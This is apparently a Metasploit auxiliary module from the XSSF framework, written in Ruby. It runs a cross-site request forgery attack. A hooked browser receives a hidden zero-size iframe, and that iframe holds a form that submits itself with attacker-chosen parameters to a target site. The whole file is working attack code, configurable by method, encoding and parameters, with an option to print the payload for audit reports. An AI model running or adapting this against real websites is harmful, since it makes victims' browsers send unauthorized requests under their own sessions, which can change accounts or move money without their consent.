require 'msf/core'
require 'xssf'

#
# READ README_XSSF FILE FOR MORE INFORMATION ABOUT MODULES
#
class Metasploit3 < Msf::Auxiliary
	include Msf::Xssf::XssfServer

	# Module initialization
	def initialize(info = {})
		super(update_info(info,
			'Name'        => 'Cross-Site Request Forgery (CSRF)',
			'Description' => 'Performs a CSRF attack to remote domain vulnerable (can be performed from XSSF test page)'
		))
		
		register_options(
			[
				OptString.new('vulnWebsite', [true, "Targeted vulnerable webpage (including all host path)", 'http://www.example.com/index.jsp']),
				OptEnum.new('method', [true, "CSRF formulary submit method", 'POST', ['GET', 'POST']]),
				OptEnum.new('enctype', [true, "Formulary enctype", 'application/x-www-form-urlencoded', ['application/x-www-form-urlencoded', 'text/plain', 'multipart/form-data']]),
				OptString.new('params', [true, "Formulary parameters given like param1=data1&param2=data2... (Replace & with %26 and = with %3D if present in data)"]),
				OptBool.new('printPayload', [true, "Prints sent payload (for copying/pasting in audit reports)", false])
			], self.class
		)
	end

	# Part sent to the victim, insert your code here !!!
	def on_request_uri(cli, req)
		if (req.uri =~ /myframe\.html/i)
			code = %Q{
				<html>
					<body>
						<form id="f" enctype="#{datastore['enctype']}" method='#{datastore['method']}' action='#{datastore['vulnWebsite']}'>
			}
			
			(datastore['params'].split('&')).each do |p|
				if (p.gsub(/"/, '%22') =~ /(.*)=(.*)/)
					code << %Q{<input type="text" name="#{$1}" value="#{($2.gsub(/\%26/, '&')).gsub(/\%3D/, '=')}">\n}
				end
			end

			code << %Q{
						</form>

						<script>document.getElementById('f').submit();</script>
					</body>
				</html>
			}
			
			print code.to_s if datastore['printPayload']
		
			send_response(cli, code)
		else
			code = %Q{
				f = XSSF_CREATE_IFRAME('csrf', 0, 0)
				f.src = XSSF_SERVER + 'myframe.html';
				document.body.appendChild(f);
			}
			
			send_response(cli, code)
		end
	end
end